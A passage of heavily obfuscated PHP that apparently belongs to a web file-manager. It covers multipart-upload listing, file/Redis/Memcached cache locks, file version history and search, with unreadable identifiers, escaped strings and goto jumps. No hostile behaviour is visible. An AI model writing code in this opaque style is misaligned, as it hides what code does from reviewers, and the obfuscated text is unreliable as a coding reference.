$öö±™ÍÛ[254]) === 0) { if (isset($»ü«ìÂÎ[$öö±™ÍÛ[1473]])) { $ç²»ì† = $»ü«ìÂÎ[$öö±™ÍÛ[1473]]; } else { if (isset($íµÄ²ìƒ[$öö±™ÍÛ[1473]])) { $ç²»ì† = $íµÄ²ìƒ[$öö±™ÍÛ[1473]]; } else { $ç²»ì† = hash($öö±™ÍÛ[284], $öö±™ÍÛ[22]); } } return array($öö±™ÍÛ[260] => $íµÄ²ìƒ[$öö±™ÍÛ[260]], $öö±™ÍÛ[1473] => $ç²»ì†, $öö±™ÍÛ[251] => $íµÄ²ìƒ[$öö±™ÍÛ[1476]]); } return $íµÄ²ìƒ[$öö±™ÍÛ[260]]; } public function listUploadParts($÷á¡‹È’, $üÉÄÓä = array()) { $‘Ğ³½ôê =& $_SERVER[•€áå–Õ]; $ÏÇæ«Èù = str_replace($‘Ğ³½ôê[261], $‘Ğ³½ôê[22], $üÉÄÓä[$‘Ğ³½ôê[187]]); $ÊÛïîß² = $this->client->listParts($this->bucket, $÷á¡‹È’, $ÏÇæ«Èù); if (!$ÊÛïîß²) { return !1; } $îŸë¯Éˆ = $‘Ğ³½ôê[1477]; foreach ($ÊÛïîß² as $é™¾˜¦é) { $îŸë¯Éˆ .= $‘Ğ³½ôê[1478] . "\74\120\141\162\164\116\165\155\x62\x65\x72\76{$é™¾˜¦é[$‘Ğ³½ôê[1434]]}\x3c\x2f\x50\x61\162\164\x4e\x75\x6d\x62\x65\162\76\12" . "\74\x45\x54\x61\147\x3e{$é™¾˜¦é[$‘Ğ³½ôê[1435]]}\x3c\x2f\105\x54\141\147\x3e\12" . $‘Ğ³½ôê[1479]; } $îŸë¯Éˆ .= $‘Ğ³½ôê[1480]; $¢¥“´‰Î = array(); $ÓŒ ²ìö = explode($‘Ğ³½ôê[210], $this->getHost()); $íâÈÍ¾á = array($‘Ğ³½ôê[1474] => $ÓŒ ²ìö[1], $‘Ğ³½ôê[242] => $‘Ğ³½ôê[132], $‘Ğ³½ôê[286] => strlen($îŸë¯Éˆ)); $—ˆ‚¥¤ù = $‘Ğ³½ôê[253]; $ø¸úÄ»‰ = $‘Ğ³½ôê[18] . $this->pathEncode($÷á¡‹È’) . $üÉÄÓä[$‘Ğ³½ôê[187]]; $©¤ÑçÆÉ = $this->client->__getSignatureV4($¢¥“´‰Î, $íâÈÍ¾á, $—ˆ‚¥¤ù, $ø¸úÄ»‰, $îŸë¯Éˆ); return array($‘Ğ³½ôê[260] => $©¤ÑçÆÉ[$‘Ğ³½ôê[260]], $‘Ğ³½ôê[251] => $©¤ÑçÆÉ[$‘Ğ³½ôê[1476]], $‘Ğ³½ôê[262] => $ÊÛïîß², $‘Ğ³½ôê[1473] => $©¤ÑçÆÉ[$‘Ğ³½ôê[1473]]); } public function link($Ş˜íÔñ, $ö¤ºà©¼ = array()) { return parent::link($Ş˜íÔñ, $ö¤ºà©¼); } public function fileOut($ÅÄæóíš, $” ‰™è = false, $Î‹†¦ù¦ = false, $í“¼ºÏ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[•€áå–Õ][1481])) { return parent::fileOutServer($ÅÄæóíš, $” ‰™è, $Î‹†¦ù¦, $í“¼ºÏ); } parent::fileOut($ÅÄæóíš, $” ‰™è, $Î‹†¦ù¦, $í“¼ºÏ); } public function fileOutImage($Ç¼ó±¼Û, $ºöî„‡† = 250) { if (strstr($this->endpoint, $_SERVER[•€áå–Õ][1481])) { return parent::fileOutImageServer($Ç¼ó±¼Û, $ºöî„‡†); } parent::fileOutImage($Ç¼ó±¼Û, $ºöî„‡†); } public function fileOutLink($ÈÊœÆ‰î) { $— Á¼§ú =& $_SERVER[•€áå–Õ]; if (substr($ÈÊœÆ‰î, 0, 7) == $— Á¼§ú[1372]) { $ÈÊœÆ‰î = $— Á¼§ú[1373] . substr($ÈÊœÆ‰î, 7); } header($— Á¼§ú[174] . $ÈÊœÆ‰î); die; } public function getHost() { $˜’ÙØâ— =& $_SERVER[•€áå–Õ]; $é””‘È¥ = str_rtrim(parent::getHost(), $˜’ÙØâ—[18] . $this->bucket); $é””‘È¥ = explode($˜’ÙØâ—[210], $é””‘È¥); return $é””‘È¥[0] . $˜’ÙØâ—[210] . $this->bucket . $˜’ÙØâ—[20] . $é””‘È¥[1]; } } goto D“ÑêÆ§ÉÈ; DöÀÎ©à˜: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Ğº±‘è =& $_SERVER[•€áå–Õ]; $Î¦ü‘–« = $GLOBALS[$Ğº±‘è[16]][$Ğº±‘è[404]]; self::$cachePath = $Î¦ü‘–«[$Ğº±‘è[226]][$Ğº±‘è[96]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ùø‹ïº«, $Áß×ğ˜Î = 0) { $°Í“æÊ¯ =& $_SERVER[•€áå–Õ]; $•±Şï = microtime(!0); $‘ÊùÇØœ = $•±Şï + $Áß×ğ˜Î + 0.0001; $¶‚ó…¢¤ = rtrim(self::$cachePath, $°Í“æÊ¯[18]) . $°Í“æÊ¯[905] . md5($Ùø‹ïº«) . $°Í“æÊ¯[902]; if (file_exists($¶‚ó…¢¤) && filemtime($¶‚ó…¢¤) && filemtime($¶‚ó…¢¤) < time() - 10) { @unlink($¶‚ó…¢¤); } do { if (file_exists($¶‚ó…¢¤)) { cacheLockWait(); continue; } $•£È‘Ú¬ = fopen($¶‚ó…¢¤, $°Í“æÊ¯[906]); if (!$•£È‘Ú¬) { return !1; } $¢³Œ¨Ô = flock($•£È‘Ú¬, LOCK_EX | LOCK_NB); self::$caches[$Ùø‹ïº«] = array($°Í“æÊ¯[907] => $•£È‘Ú¬, $°Í“æÊ¯[226] => $¶‚ó…¢¤); fwrite($•£È‘Ú¬, $‘ÊùÇØœ); clearstatcache(); if ($•£È‘Ú¬ && $¢³Œ¨Ô) { return !0; } cacheLockWait(); } while (microtime(!0) < $‘ÊùÇØœ); $this->unlock($Ùø‹ïº«); return !1; } public function lockGet($ëÜ‹€”’) { $§¬úÈÜ´ =& $_SERVER[•€áå–Õ]; $ì‹Îß‘á = rtrim(self::$cachePath, $§¬úÈÜ´[18]) . $§¬úÈÜ´[905] . md5($ëÜ‹€”’) . $§¬úÈÜ´[902]; return file_exists($ì‹Îß‘á); } public function unlock($‹ê…ÈÉ) { $¹ÔÚ¯’Ù =& $_SERVER[•€áå–Õ]; $ ô“õ…Œ = self::$caches[$‹ê…ÈÉ]; if (!$ ô“õ…Œ) { return; } @flock($ ô“õ…Œ[$¹ÔÚ¯’Ù[907]], LOCK_UN); @fclose($ ô“õ…Œ[$¹ÔÚ¯’Ù[907]]); @unlink($ ô“õ…Œ[$¹ÔÚ¯’Ù[226]]); unset(self::$caches[$‹ê…ÈÉ]); } } class CacheLockRedis { public function lock($ÛùÇºÑä, $ç†ÜÁÚ„ = 10) { $’°àÑÉ = Cache::init(); $Šö˜Âóş = microtime(!0) + $ç†ÜÁÚ„; while (microtime(!0) < $Šö˜Âóş) { $™ƒàó¼é = $’°àÑÉ->get($ÛùÇºÑä); if (!$™ƒàó¼é) { $¹–Æ“ø = $’°àÑÉ->setLock($ÛùÇºÑä, $Šö˜Âóş, $ç†ÜÁÚ„); if ($¹–Æ“ø) { return !0; } } else { if ($™ƒàó¼é < microtime(!0)) { $’°àÑÉ->set($ÛùÇºÑä, $Šö˜Âóş, $ç†ÜÁÚ„ * 2); if ($’°àÑÉ->get($ÛùÇºÑä) === $™ƒàó¼é) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($øß›ÈÑ) { return Cache::init()->get($øß›ÈÑ); } public function unlock($çÎ¦Æ) { return Cache::init()->remove($çÎ¦Æ); } } class CacheLockMemcached { public function lock($çîïë÷Ù, $À§ú—Òî = 0) { $”àÒ› = Cache::init(); $­Æ¹™Äƒ = microtime(!0) + $À§ú—Òî; while (microtime(!0) < $­Æ¹™Äƒ) { $¨³ğÂİ = $”àÒ›->get($çîïë÷Ù); if (!$¨³ğÂİ || $¨³ğÂİ < microtime(!0)) { $ùÕ¹ûó = $”àÒ›->handle->add($çîïë÷Ù, $­Æ¹™Äƒ, $À§ú—Òî); if ($ùÕ¹ûó) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($à¢Òò’Ì) { return Cache::init()->get($à¢Òò’Ì); } public function unlock($×Ú°­Ï) { return Cache::init()->remove($×Ú°­Ï); } } goto AÃêß†«®ó; B¤¼’…¹†¬: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\x72\143\145\x5f\x68\151\163\164\x6f\162\171"; public function historyCount($¸¢¹Û½€) { $ÉÎ£¯© =& $_SERVER[•€áå–Õ]; if (!$¸¢¹Û½€) { return array(); } if (is_string($¸¢¹Û½€) || is_int($¸¢¹Û½€)) { $¸¢¹Û½€ = array($¸¢¹Û½€); } $¾©–Ç¸Â = array($ÉÎ£¯©[193], $ÉÎ£¯©[1924] => $ÉÎ£¯©[545]); $¯ÒÑßË = array($ÉÎ£¯©[193] => array($ÉÎ£¯©[17], $¸¢¹Û½€)); $À¾¬Îœğ = $this->field($¾©–Ç¸Â)->where($¯ÒÑßË)->group($ÉÎ£¯©[193])->select(); return array_to_keyvalue($À¾¬Îœğ, $ÉÎ£¯©[193], $ÉÎ£¯©[545]); } public function addHistory($ïŸƒŸö, $åûªÖ¨µ = '') { $¸œĞªùÄ =& $_SERVER[•€áå–Õ]; $æÊÙ‚àİ = array($¸œĞªùÄ[470] => $ïŸƒŸö[$¸œĞªùÄ[193]], $¸œĞªùÄ[1684] => isset($ïŸƒŸö[$¸œĞªùÄ[508]]) ? $ïŸƒŸö[$¸œĞªùÄ[508]] : $ïŸƒŸö[$¸œĞªùÄ[506]], $¸œĞªùÄ[521] => $ïŸƒŸö[$¸œĞªùÄ[520]], $¸œĞªùÄ[596] => $ïŸƒŸö[$¸œĞªùÄ[88]], $¸œĞªùÄ[2136] => $åûªÖ¨µ); if ($GLOBALS[$¸œĞªùÄ[16]][$¸œĞªùÄ[101]][$¸œĞªùÄ[1258]] >= 1) { $this->historyAutoClear($æÊÙ‚àİ[$¸œĞªùÄ[193]]); $this->add($æÊÙ‚àİ); } Hook::trigger($¸œĞªùÄ[2137], $æÊÙ‚àİ); Model($¸œĞªùÄ[2138])->eventFileEdit($ïŸƒŸö[$¸œĞªùÄ[193]]); } private function historyAutoClear($ü÷°Á°Ç) { $ïÑÒûÁÖ =& $_SERVER[•€áå–Õ]; $Ûò×›Âß = Model($ïÑÒûÁÖ[811])->get($ïÑÒûÁÖ[1280]); $óÌ°Óå¿ = intval($GLOBALS[$ïÑÒûÁÖ[16]][$ïÑÒûÁÖ[101]][$ïÑÒûÁÖ[1258]]); $µŒ§ëú¡ = $Ûò×›Âß == $ïÑÒûÁÖ[1281] ? min(5, $óÌ°Óå¿) : $óÌ°Óå¿; $µŒ§ëú¡ = $µŒ§ëú¡ <= 0 ? 0 : $µŒ§ëú¡ - 1; if ($µŒ§ëú¡ >= 500) { return; } $¨¡ç¶ø = array($ïÑÒûÁÖ[470] => $ü÷°Á°Ç); $Ÿë‚¯Úß = $this->field($ïÑÒûÁÖ[2139])->where($¨¡ç¶ø)->order($ïÑÒûÁÖ[2133])->select(); if (!$Ÿë‚¯Úß || $µŒ§ëú¡ >= count($Ÿë‚¯Úß)) { return; } $Åí¡“ª = array_to_keyvalue($Ÿë‚¯Úß, $ïÑÒûÁÖ[22], $ïÑÒûÁÖ[454]); $Åí¡“ª = array_slice($Åí¡“ª, $µŒ§ëú¡); $¦¯ÚÆ = array_to_keyvalue($Ÿë‚¯Úß, $ïÑÒûÁÖ[22], $ïÑÒûÁÖ[520]); $¦¯ÚÆ = array_slice($¦¯ÚÆ, $µŒ§ëú¡); if (!$Åí¡“ª || !$¦¯ÚÆ) { return; } $¨¡ç¶ø = array($ïÑÒûÁÖ[472] => array($ïÑÒûÁÖ[17], $Åí¡“ª)); $this->where($¨¡ç¶ø)->delete(); Model($ïÑÒûÁÖ[523])->remove($¦¯ÚÆ); } public function listData($‹¢Æ»İ) { $òâÉ“€÷ =& $_SERVER[•€áå–Õ]; $Ö»„ËÊ = array($òâÉ“€÷[470] => $‹¢Æ»İ); $Á®–¯Ò = $òâÉ“€÷[2140]; $ÁİÚ´ö = $this->field($Á®–¯Ò)->where($Ö»„ËÊ)->order($òâÉ“€÷[2133])->selectPage(); $this->_listAppendUser($ÁİÚ´ö[$òâÉ“€÷[424]]); $–÷Ğıµ = Model($òâÉ“€÷[811])->get($òâÉ“€÷[1280]); $³ìŠìùç = 5; if ($–÷Ğıµ == $òâÉ“€÷[1281]) { $ÁİÚ´ö[$òâÉ“€÷[424]] = array_slice($ÁİÚ´ö[$òâÉ“€÷[424]], 0, $³ìŠìùç); $ÁİÚ´ö[$òâÉ“€÷[421]] = array($òâÉ“€÷[2141] => 1, $òâÉ“€÷[2142] => 20, $òâÉ“€÷[2143] => 1, $òâÉ“€÷[2144] => count($ÁİÚ´ö[$òâÉ“€÷[424]])); } return $ÁİÚ´ö; } protected function _listAppendUser(&$¡™¥Ù™) { $µİÔ¨€Ò =& $_SERVER[•€áå–Õ]; $¢Ş‹ƒ“û = array_to_keyvalue($¡™¥Ù™, $µİÔ¨€Ò[22], $µİÔ¨€Ò[1693]); $§­ƒæ÷¡ = Model($µİÔ¨€Ò[578])->userListInfo($¢Ş‹ƒ“û); foreach ($¡™¥Ù™ as &$€æãñ²‘) { $õ¤¾ªõ = $€æãñ²‘[$µİÔ¨€Ò[1693]]; $€æãñ²‘[$µİÔ¨€Ò[506]] = $§­ƒæ÷¡[$õ¤¾ªõ] ? $§­ƒæ÷¡[$õ¤¾ªõ] : !1; } unset($€æãñ²‘); } public function fileInfo($Ñ‚áã) { $¾¯‚şšÑ =& $_SERVER[•€áå–Õ]; $ãêÍ›Ú¬ = $this->tablePrefix; $ĞßÏ•¨ñ = "{$ãêÍ›Ú¬}\151\157\x5f\146\151\154\x65\x20\x66\151\154\x65\x73\40\157\x6e\x20\146\x69\154\x65\x73\56\146\x69\x6c\145\x49\x44\x20\x3d\x20\x68\x69\163\164\157\x72\x79\x2e\146\151\154\x65\x49\x44"; return $this->alias($¾¯‚şšÑ[2145])->where(array($¾¯‚şšÑ[472] => $Ñ‚áã))->join($ĞßÏ•¨ñ, $¾¯‚şšÑ[2146])->find(); } public function removeItem($ÊõáşıŞ) { $»¨Úªö =& $_SERVER[•€áå–Õ]; $¡‹·ª°Ã = array($»¨Úªö[472] => $ÊõáşıŞ); $œ•µõò = $this->where($¡‹·ª°Ã)->find(); if ($œ•µõò) { $’¹Ô²¨Ë = $this->where($¡‹·ª°Ã)->delete(); Model($»¨Úªö[523])->remove($œ•µõò[$»¨Úªö[520]]); return $’¹Ô²¨Ë; } return !1; } public function removeBySource($…×äé…Ô) { $ÁÉÉÛ² =& $_SERVER[•€áå–Õ]; if (!$…×äé…Ô) { return !1; } if (!is_array($…×äé…Ô)) { $…×äé…Ô = array($…×äé…Ô); } $·ÒËùß = array($ÁÉÉÛ²[470] => array($ÁÉÉÛ²[17], $…×äé…Ô)); $ÃÈ¿ÜÊ— = $this->field($ÁÉÉÛ²[521])->where($·ÒËùß)->select(); if ($ÃÈ¿ÜÊ—) { $this->where($·ÒËùß)->delete(); $ £ä¢ß§ = array_to_keyvalue($ÃÈ¿ÜÊ—, $ÁÉÉÛ²[22], $ÁÉÉÛ²[520]); Model($ÁÉÉÛ²[523])->remove($ £ä¢ß§); } return !0; } public function setDetail($Ê‹‚¶”À, $Á·©¥µš) { $½Œ¿úÜ =& $_SERVER[•€áå–Õ]; return $this->where(array($½Œ¿úÜ[472] => $Ê‹‚¶”À))->save(array($½Œ¿úÜ[2136] => $Á·©¥µš)); } public function rollbackToItem($êÑŞŞËÆ, $ã×—‚ÚÅ) { $Ã¥óïëì =& $_SERVER[•€áå–Õ]; $³Å’´Ş… = Model($Ã¥óïëì[866])->sourceInfo($êÑŞŞËÆ); $this->addHistory($³Å’´Ş…, LNG($Ã¥óïëì[2147])); $—ØÇİÌ³ = $this->find($ã×—‚ÚÅ); $‰ºì¶‘ = array($Ã¥óïëì[520] => $—ØÇİÌ³[$Ã¥óïëì[520]], $Ã¥óïëì[88] => $—ØÇİÌ³[$Ã¥óïëì[88]], $Ã¥óïëì[97] => time(), $Ã¥óïëì[508] => USER_ID); Model($Ã¥óïëì[866])->where(array($Ã¥óïëì[193] => $êÑŞŞËÆ))->save($‰ºì¶‘); return $this->where(array($Ã¥óïëì[472] => $ã×—‚ÚÅ))->delete(); } public function clearSame($ß¹·Ì·Ã) { $Ëºªüºˆ =& $_SERVER[•€áå–Õ]; $©Ï‡“ï = $this->listData($ß¹·Ì·Ã); $ÅÅ¶¤§‰ = array_to_keyvalue_group($©Ï‡“ï, $Ëºªüºˆ[520]); $İõßœá’ = array(); $”‹‚ù¨› = array(); foreach ($ÅÅ¶¤§‰ as $ÄœÏô‘) { if (!$ÄœÏô‘ || count($ÄœÏô‘) <= 1) { continue; } foreach ($ÄœÏô‘ as $‡èªÂŞ·) { $İõßœá’[] = $‡èªÂŞ·[$Ëºªüºˆ[520]]; $”‹‚ù¨›[] = $‡èªÂŞ·[$Ëºªüºˆ[454]]; } } if (!$”‹‚ù¨›) { return; } $this->where(array($Ëºªüºˆ[454] => array($Ëºªüºˆ[17], $”‹‚ù¨›)))->delete(); Model($Ëºªüºˆ[523])->remove($İõßœá’); } public function userSpace() { $î§¡£µÉ =& $_SERVER[•€áå–Õ]; $øÆâôÆÆ = $this->tablePrefix; $Ï•¾ˆ¢ü = array($î§¡£µÉ[1684] => USER_ID); $ªê¾ƒ£æ = "{$øÆâôÆÆ}\151\157\x5f\146\151\x6c\x65\40\146\151\154\x65\163\40\x6f\x6e\40\x66\151\x6c\x65\163\56\x66\x69\x6c\x65\111\x44\40\75\x20\150\151\163\164\157\162\x79\x2e\146\151\x6c\145\x49\104"; return $this->alias($î§¡£µÉ[2145])->where($Ï•¾ˆ¢ü)->join($ªê¾ƒ£æ, $î§¡£µÉ[2146])->sum($î§¡£µÉ[88]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Ò©œ–õ) { $ïò£ÓšŒ =& $_SERVER[•€áå–Õ]; $³ëÇÎûğ = KodIO::fileTypeList(); $¡ÀÂé³ù = $³ëÇÎûğ[$Ò©œ–õ]; if (!$¡ÀÂé³ù) { return array(); } $¤´“‡ë‘ = $¡ÀÂé³ù[$ïò£ÓšŒ[187]]; $Î¨çÌòê = $ïò£ÓšŒ[17]; if (!$¡ÀÂé³ù[$ïò£ÓšŒ[187]]) { $Ñõ÷ÉØ = array_to_keyvalue($³ëÇÎûğ, $ïò£ÓšŒ[22], $ïò£ÓšŒ[187]); $¤´“‡ë‘ = implode($ïò£ÓšŒ[60], $Ñõ÷ÉØ); $Î¨çÌòê = $ïò£ÓšŒ[2148]; } $Šâá°„› = explode($ïò£ÓšŒ[60], trim($¤´“‡ë‘, $ïò£ÓšŒ[60])); return array($Î¨çÌòê, $Šâá°„›); } public function listPathType($×áêÍ×…) { $ü„•ÕËâ =& $_SERVER[•€áå–Õ]; $˜À®á½ = $this->fileTypeWhere($×áêÍ×…); if (!$˜À®á½) { return array(); } $ƒ¢¢¿ıé = USER_ID; $¢û‚›§­ = Model($ü„•ÕËâ[578])->getInfo($ƒ¢¢¿ıé); $úŒ™ÄóÚ = array($ü„•ÕËâ[627] => SourceModel::TYPE_USER, $ü„•ÕËâ[564] => array($ü„•ÕËâ[591], $ü„•ÕËâ[574] . $¢û‚›§­[$ü„•ÕËâ[99]][$ü„•ÕËâ[193]] . $ü„•ÕËâ[592]), $ü„•ÕËâ[628] => $ƒ¢¢¿ıé, $ü„•ÕËâ[625] => 0, $ü„•ÕËâ[626] => $˜À®á½); return $this->listSource($úŒ™ÄóÚ); } public function listSearch($ö¶äĞûì, $õÃ÷Øåî = 300) { $¹‚–Ôê =& $_SERVER[•€áå–Õ]; if (isset($ö¶äĞûì[$¹‚–Ôê[1985]]) && $ö¶äĞûì[$¹‚–Ôê[1985]]) { $ö¶äĞûì[$¹‚–Ôê[1985]] = str_replace($¹‚–Ôê[439], $¹‚–Ôê[2149], trim($ö¶äĞûì[$¹‚–Ôê[1985]])); } $©ü™¢§ = $this->_parseSearchWhere($ö¶äĞûì); if (!isset($©ü™¢§[$¹‚–Ôê[484]])) { $©ü™¢§[$¹‚–Ôê[484]] = 0; } $½‰ËÊÊÃ = $¹‚–Ôê[2150]; $Ã·ºÔ… = $©ü™¢§; $£èõ­Ë½ = $½‰ËÊÊÃ; $this->_listSearchBindPinyin($ö¶äĞûì, $©ü™¢§, $½‰ËÊÊÃ); $this->alias($¹‚–Ôê[498])->_makeOrder(); $©ü™¢§ = $this->parseWhereLike($©ü™¢§); $ûÓÆŸ³Ô = $this->distinct(!0)->field($½‰ËÊÊÃ)->where($©ü™¢§)->selectPage($õÃ÷Øåî); if ($GLOBALS[$¹‚–Ôê[16]][$¹‚–Ôê[436]][$¹‚–Ôê[437]] && Input::check($ö¶äĞûì[$¹‚–Ôê[1985]], $¹‚–Ôê[634]) && $ûÓÆŸ³Ô[$¹‚–Ôê[421]][$¹‚–Ôê[408]] == 1 && $ûÓÆŸ³Ô[$¹‚–Ôê[421]][$¹‚–Ôê[422]] == 0) { $ûÓÆŸ³Ô = $this->distinct(!0)->field($½‰ËÊÊÃ)->where($Ã·ºÔ…)->limit(1000)->select(); $ûÓÆŸ³Ô = array_page_split($ûÓÆŸ³Ô, !1, $õÃ÷Øåî); } $this->_listSearchFileContent($ûÓÆŸ³Ô, $ö¶äĞûì, $£èõ­Ë½, $Ã·ºÔ…); $this->_listSearchDesc($ûÓÆŸ³Ô, $ö¶äĞûì, $£èõ­Ë½); $this->_listSearchTag($ûÓÆŸ³Ô, $ö¶äĞûì, $£èõ­Ë½); $this->_listSearchGroupTag($ûÓÆŸ³Ô, $ö¶äĞûì, $£èõ­Ë½); $this->_listDataApply($ûÓÆŸ³Ô[$¹‚–Ôê[424]]); $this->_listMake($ûÓÆŸ³Ô); return $ûÓÆŸ³Ô; } private function _listSearchFileContent(&$µê»¬…è, $ºœÉ¢÷, $’ı¦²Æı, $¢´›ğ§ñ) { $Ã¹ò´æÇ =& $_SERVER[•€áå–Õ]; if (!$ºœÉ¢÷[$Ã¹ò´æÇ[1985]] || $µê»¬…è[$Ã¹ò´æÇ[421]][$Ã¹ò´æÇ[408]] > 1) { return; } if (!isset($¢´›ğ§ñ[$Ã¹ò´æÇ[42]]) || !is_array($ºœÉ¢÷[$Ã¹ò´æÇ[520]])) { return; } $¢´›ğ§ñ[$Ã¹ò´æÇ[520]] = array($Ã¹ò´æÇ[17], $ºœÉ¢÷[$Ã¹ò´æÇ[520]]); unset($¢´›ğ§ñ[$Ã¹ò´æÇ[42]]); unset($ºœÉ¢÷[$Ã¹ò´æÇ[520]]); $ªÂÀ¬›˜ = $this->field($’ı¦²Æı)->where($¢´›ğ§ñ)->limit($Ã¹ò´æÇ[2151])->select(); if (!$ªÂÀ¬›˜ || count($ªÂÀ¬›˜) == 0) { return; } $µê»¬…è[$Ã¹ò´æÇ[424]] = array_merge($ªÂÀ¬›˜, $µê»¬…è[$Ã¹ò´æÇ[424]]); $µê»¬…è[$Ã¹ò´æÇ[421]][$Ã¹ò´æÇ[422]] += count($ªÂÀ¬›˜); } private function _listSearchTag(&$¥ìÎ¢Å², $¬€ñ—œ, $–Õ¬ÄŒ÷) { $â®ÑŒÓ« =& $_SERVER[•€áå–Õ]; if (!$¬€ñ—œ[$â®ÑŒÓ«[1985]] || $¥ìÎ¢Å²[$â®ÑŒÓ«[421]][$â®ÑŒÓ«[408]] > 1) { return; } $š¾µ‘ĞÎ = Model($â®ÑŒÓ«[2152])->listData(); $ˆƒ×’ = array(); $ÍûÁáµç = $¬€ñ—œ[$â®ÑŒÓ«[1985]]; foreach ($š¾µ‘ĞÎ as $Ôí³¶€ª) { $ú—ÖíÔÒ = $Ôí³¶€ª[$â®ÑŒÓ«[42]]; $ï¿¡ıĞ‘ = str_replace($â®ÑŒÓ«[63], $â®ÑŒÓ«[22], Pinyin::get($ú—ÖíÔÒ)); if (stripos($ú—ÖíÔÒ, $ÍûÁáµç) !== !1 || stripos($ï¿¡ıĞ‘, $ÍûÁáµç) !== !1) { $ˆƒ×’[] = $Ôí³¶€ª[$â®ÑŒÓ«[454]]; } } if (!$ˆƒ×’) { return; } $ïíë®‡Ä = array($â®ÑŒÓ«[479] => array($â®ÑŒÓ«[17], $ˆƒ×’), $â®ÑŒÓ«[1693] => USER_ID); $¦ñğÁÆî = Model($â®ÑŒÓ«[481])->field($â®ÑŒÓ«[96])->where($ïíë®‡Ä)->select(); $¦ñğÁÆî = array_to_keyvalue($¦ñğÁÆî, $â®ÑŒÓ«[22], $â®ÑŒÓ«[96]); $Ñ‡Ü×ÜÚ = array_unique($¦ñğÁÆî); $this->_listSearchMerge($¥ìÎ¢Å², $¬€ñ—œ, $–Õ¬ÄŒ÷, $Ñ‡Ü×ÜÚ); } private function _listSearchDesc(&$š’·òŠÊ, $ èÍŸâ, $äèï—È) { $«èŠÈß› =& $_SERVER[•€áå–Õ]; if (!$ èÍŸâ[$«èŠÈß›[1985]] || $š’·òŠÊ[$«èŠÈß›[421]][$«èŠÈß›[408]] > 1) { return; } $ü¨Ë¾şî = array($«èŠÈß›[106] => $«èŠÈß›[505], $«èŠÈß›[429] => array($«èŠÈß›[438], $«èŠÈß›[1987] . $ èÍŸâ[$«èŠÈß›[1985]] . $«èŠÈß›[1987])); $©‡˜Ë×Ù = !1; if ($©‡˜Ë×Ù) { $Æ½ÆüçŠ = $this->listSearchChildren($ èÍŸâ[$«èŠÈß›[192]]); $Æ½ÆüçŠ = array_unique($Æ½ÆüçŠ); if (!$Æ½ÆüçŠ) { return; } $ü¨Ë¾şî[$«èŠÈß›[193]] = array($«èŠÈß›[17], $Æ½ÆüçŠ); } $â×ÑÍşµ = Model($«èŠÈß›[611])->field($«èŠÈß›[193])->where($ü¨Ë¾şî)->limit(5000)->select(); $ñ…ÌÅ£ = array_to_keyvalue($â×ÑÍşµ, $«èŠÈß›[22], $«èŠÈß›[193]); $this->_listSearchMerge($š’·òŠÊ, $ èÍŸâ, $äèï—È, $ñ…ÌÅ£); } private function _listSearchGroupTag(&$ÔÑìß¼Ú, $·ÔóŠƒÕ, $ãæš“ª) { $‹Ø›®×¯ =& $_SERVER[•€áå–Õ]; if (!$·ÔóŠƒÕ[$‹Ø›®×¯[1985]] || $ÔÑìß¼Ú[$‹Ø›®×¯[421]][$‹Ø›®×¯[408]] > 1 || !$·ÔóŠƒÕ[$‹Ø›®×¯[192]]) { return; } $ƒàƒìú» = $this->sourceInfo($·ÔóŠƒÕ[$‹Ø›®×¯[192]]); if (!$ƒàƒìú» || $ƒàƒìú»[$‹Ø›®×¯[190]] != SourceModel::TYPE_GROUP) { return; } $ËÈ— ÚÒ = $ƒàƒìú»[$‹Ø›®×¯[549]]; $›ñÙşê = Model($‹Ø›®×¯[2153])->get($ËÈ— ÚÒ); $”†¾âÎ = array(); $ûËì©Îà = $·ÔóŠƒÕ[$‹Ø›®×¯[1985]]; foreach ($›ñÙşê[$‹Ø›®×¯[424]] as $¬³§Çü) { $ÂªÆÄæÇ = $¬³§Çü[$‹Ø›®×¯[42]]; $áçë‹ØÙ = str_replace($‹Ø›®×¯[63], $‹Ø›®×¯[22], Pinyin::get($ÂªÆÄæÇ)); if (stripos($ÂªÆÄæÇ, $ûËì©Îà) !== !1 || stripos($áçë‹ØÙ, $ûËì©Îà) !== !1) { $”†¾âÎ[] = $¬³§Çü[$‹Ø›®×¯[454]]; } } if (!$”†¾âÎ) { return; } $¿éÔ»‹ñ = array($‹Ø›®×¯[479] => array($‹Ø›®×¯[17], $”†¾âÎ), $‹Ø›®×¯[1693] => 0, $‹Ø›®×¯[43] => $‹Ø›®×¯[2007] . $ËÈ— ÚÒ); $Õ“ÀŞ‡“ = Model($‹Ø›®×¯[481])->field($‹Ø›®×¯[96])->where($¿éÔ»‹ñ)->select(); $Õ“ÀŞ‡“ = array_to_keyvalue($Õ“ÀŞ‡“, $‹Ø›®×¯[22], $‹Ø›®×¯[96]); $ÊíÖµÒí = array_unique($Õ“ÀŞ‡“); $this->_listSearchMerge($ÔÑìß¼Ú, $·ÔóŠƒÕ, $ãæš“ª, $ÊíÖµÒí); } private function _listSearchMerge(&$ó´€ÚÌ÷, $˜Ò ©µŞ, $§áš×ö, $•šèÒîà) { $ãşÆÎ¸ =& $_SERVER[•€áå–Õ]; if (!$•šèÒîà) { return; } $¾•Ò“«ó = array_to_keyvalue($ó´€ÚÌ÷[$ãşÆÎ¸[424]], $ãşÆÎ¸[22], $ãşÆÎ¸[193]); $Å¼š¶¡Â = array_diff($•šèÒîà, $¾•Ò“«ó); if (!$Å¼š¶¡Â) { return; } $‚Ó°¬»– = array($ãşÆÎ¸[193] => array($ãşÆÎ¸[17], $Å¼š¶¡Â)); $ƒÉ’ñ£ = $this->field($§áš×ö)->where($‚Ó°¬»–)->select(); if (!$ƒÉ’ñ£) { return; } $­›•ø­ = array(); foreach ($ƒÉ’ñ£ as $® ˆ‘–ï) { if ($this->_listSearchFilter($® ˆ‘–ï, $˜Ò ©µŞ)) { $­›•ø­[] = $® ˆ‘–ï; } } $ó´€ÚÌ÷[$ãşÆÎ¸[424]] = array_merge($­›•ø­, $ó´€ÚÌ÷[$ãşÆÎ¸[424]]); $ó´€ÚÌ÷[$ãşÆÎ¸[421]][$ãşÆÎ¸[422]] += count($­›•ø­); } private function _listSearchFilter($Œ¯è’ËÖ, $à¹Àå±) { $å˜ğ¢üÒ =& 